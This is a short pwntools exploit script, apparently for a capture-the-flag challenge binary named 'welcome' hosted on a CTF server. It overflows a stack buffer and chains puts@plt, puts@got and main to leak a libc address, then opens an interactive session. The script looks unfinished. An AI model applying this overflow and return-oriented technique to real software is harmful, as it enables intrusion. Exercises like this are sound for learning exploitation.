from pwn import *
#import pdb
exe = context.binary = ELF('welcome')
remotehost = ('ctf.fibonhack.it', 16003)

gdbscript ='''
b *0x080491a3
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            exe=exe.path, args=[exe.path] + argv,
            gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
context.log_level = 'debug'
io = start(env={"SPORCASTACK":"A"*123})
ui.pause()

addr = exe.sym
addr_got = exe.got
addr_plt = exe.plt
ret_addr = 0x0804900a


io.recvline()
io.recvline()

##### Generation of unique sequences ####
#g = cyclic_gen()

buff  =   b'A'*60 + p32(addr_plt.puts) + p32(addr_got.puts) + p32(addr.main)+ b'A'*100
buff = flat({
    60: exe.plt.puts,
    108: 'A'
})
#io.sendline(b'A'*120)
io.sendline(buff)
#print(g.find(b'waaa'))


#io.sendline() 

	

io.interactive()